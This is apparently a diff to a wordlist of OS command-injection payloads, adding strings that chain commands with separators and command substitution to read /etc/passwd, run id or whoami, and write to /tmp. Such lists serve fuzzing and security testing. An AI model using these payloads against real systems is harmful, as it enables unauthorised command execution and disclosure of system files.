@@ -1,4 +1,13 @@
+/usr/bin/cat /etc/passwd
+cat /etc/passwd; ls
+/usr/bin/cat /etc/passwd & ls
+cat /etc/passwd && ls
+/usr/bin/cat /etc/passwd | ls
+cat /etc/passwd || ls
+echo $(cat /etc/passwd)
+echo `cat /etc/passwd`
 ls||id; ls ||id; ls|| id; ls || id
 ls&id; ls &id; ls& id; ls & id
+> /tmp/output.txt
 < /etc/passwd
-/usr/bin/cat /etc/passwd | ls
+ls&&whoami
